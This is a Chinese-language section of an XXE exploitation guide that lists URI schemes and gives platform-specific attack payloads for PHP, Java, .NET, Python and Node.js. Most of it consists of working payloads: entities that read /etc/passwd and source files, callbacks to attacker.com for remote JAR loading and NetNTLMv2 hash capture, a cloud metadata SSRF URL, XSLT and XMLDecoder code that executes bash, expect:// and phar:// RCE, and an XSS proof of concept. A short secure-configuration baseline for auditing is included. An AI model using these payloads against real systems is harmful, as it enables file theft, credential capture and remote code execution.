## 四、协议全谱系与各平台特定利用深度

### 4.1 支持的协议总表
| 协议 | 格式 | 用途 | 平台 |
|------|------|------|------|
| `file:///` | file:///etc/passwd | 本地文件读取 | 通用 |
| `http://` / `https://` | http://host/path | SSRF/HTTP 请求 | 通用 |
| `ftp://` | ftp://host/file | FTP 文件/外带 | 通用（Java 稳定）|
| `gopher://` | gopher://host:port/_data | 任意 TCP（构造任意协议请求）| Java（现代版受限）|
| `dict://` | dict://host:port/command | 端口探测/简单命令 | 部分解析器 |
| `php://filter/` | php://filter/convert.base64-encode/resource=file | PHP 文件编码读取 | PHP |
| `php://input` / `data://` | data://text/plain,xxx | 内联数据/二次注入 | PHP |
| `compress.zlib://` | compress.zlib:///var/log/syslog.gz | 压缩文件读取 | PHP |
| `expect://` | expect://id | **RCE（需 expect 扩展）** | PHP |
| `phar://` | phar:///path/a.phar | **反序列化链（PHP 8 前）** | PHP |
| `jar://` | jar:http://host/x.zip!/entry | **远程 JAR 条目读取/写文件链** | Java |
| `netdoc:///` | netdoc:///etc/passwd | Java 文件读取（含目录列表 quirk）| Java |
| `ldap://` | ldap://host/dn | LDAP 访问/外带 | 部分解析器 |
| `tftp://` | tftp://host/file | TFTP（UDP 外带）| 部分解析器 |
| `\\host\share`（UNC）| file://host/share | **NetNTLMv2 哈希捕获** | Windows |

### 4.2 php://filter 深度利用
```xml
<!-- 基础：base64 编码读文件（避免特殊字符破坏 XML）-->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- 过滤器链：读二进制/源码时组合转换 -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16/resource=/etc/passwd">
<!-- rot13 -->
<!ENTITY xxe SYSTEM "php://filter/string.rot13/resource=/etc/passwd">
<!-- zlib 解压读取 -->
<!ENTITY xxe SYSTEM "compress.zlib:///var/log/syslog.gz">
<!-- string.strip_tags 剥离标签 -->
<!ENTITY xxe SYSTEM "php://filter/string.strip_tags/resource=/etc/passwd">
```
**注意**：PHP 8.0+ `libxml_disable_entity_loader` 已移除，默认 `LIBXML_NONET` 禁网络但**不禁止 file:// 本地读取**——本地文件读取在多数 PHP 版本仍可触发，先测 `file:///etc/passwd` 再看 php://filter。

### 4.3 jar:// 协议深度利用（Java）
```xml
<!-- 读取远程 JAR 内条目（可用于探测内网 HTTP 服务/回连验证）-->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/evil.xml">
<!-- 经典写文件链：jar 协议 + 临时目录（Java 老版本）-->
<!ENTITY xxe SYSTEM "jar:file:///tmp/evil.jar!/evil.xml">
```
**实战链**：`XXEinjector --upload=/tmp/payload.txt` 利用 jar schema 将文件写入 Java 临时目录，配合二次 XXE/序列化点触发 → 实现不出网文件写入。XXE→RCE 的 jar 链详见 4.5 的 XMLDecoder 与 XSLT。

### 4.4 netdoc 与 Java 目录列表 Quirk
```xml
<!-- netdoc 读文件（老 Java）-->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
<!-- Java file:// 特殊行为：读目录可返回目录列表（信息泄露/枚举路径）-->
<!ENTITY xxe SYSTEM "file:///var/www/">
<!-- 部分实现下 file:// 不存在的路径返回错误可当布尔注入 -->
```

### 4.5 Java 平台 XXE 与 RCE
**存在漏洞的代码形态：**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);   // 未配置任何安全 Feature → XXE
```
**XSLT → RCE（Xalan 执行 Java 代码）：**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="exec" select="rt:exec($rt,'id')"/>
  </xsl:template>
</xsl:stylesheet>
```
**XMLDecoder 反序列化 → RCE（Java 反序列化 XML 入口）：**
```xml
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String"><void index="0"><string>/bin/bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>id &gt; /tmp/pwned</string></void></array>
    </void>
  </object>
</java>
```
**安全配置基线（审计时对照）：**
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### 4.6 .NET 平台 XXE
```csharp
// 漏洞形态
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver();
doc.Load(xml);   // DtdProcessing=Parse + XmlResolver 非空才可 XXE
// 现代 .NET 显式开启 DTD 才中招：
XmlReaderSettings s = new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse, XmlResolver = new XmlUrlResolver() };
```
```xml
<!-- .NET 特定：UNC 路径触发 NetNTLMv2 哈希捕获（配合 Responder）-->
<!ENTITY xxe SYSTEM "file://attacker.com/share/">
<!-- 读 Azure 元数据 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

### 4.7 PHP 平台 XXE 与 RCE
```php
// 漏洞形态（PHP < 8.0；8.0+ 需显式 LIBXML_DTDLOAD/LIBXML_DTDATTR）
$xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
$doc = new DOMDocument(); $doc->loadXML($input, LIBXML_NOENT);
```
```xml
<!-- expect:// RCE（需安装 expect 扩展）-->
<!ENTITY xxe SYSTEM "expect://id">
<!-- phar:// 反序列化触发（PHP < 8.0，可触发 pop 链 RCE）-->
<!ENTITY xxe SYSTEM "phar:///tmp/upload.phar">
<!-- 读 PHP 源码 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
```

### 4.8 Python / Ruby / Node.js 平台
```python
# 漏洞形态：lxml 默认 resolve_entities=True；xml.sax 默认解析外部实体
from lxml import etree
tree = etree.parse(xml_file)
# 修复对照：defusedxml（唯一推荐）或 lxml 显式关闭 resolve_entities
```
```ruby
# REXML 老版本可外部实体；Nokogiri 默认安全但 JRuby 有过 NONET 失效（CVE-2026-57234）
```
```javascript
// Node.js fast-xml-parser：processEntities 默认 true
// CVE-2026-25896：实体名含 "." 被当正则通配符，shadow 内建实体 &lt; &gt; &amp; &quot; &apos;
// → 解析输出被渲染到页面时 XSS / 拼 SQL 时注入
// PoC（无需任何配置，默认即可触发）：
// <!DOCTYPE foo [ <!ENTITY l. "<img src=x onerror=alert(1)>"> ]>
// <root><text>Hello &lt;b&gt;World&lt;/b&gt;</text></root>
// 结果 text 变成: Hello <img src=x onerror=alert(1)>b>World<img src=x onerror=alert(1)>/b>
```

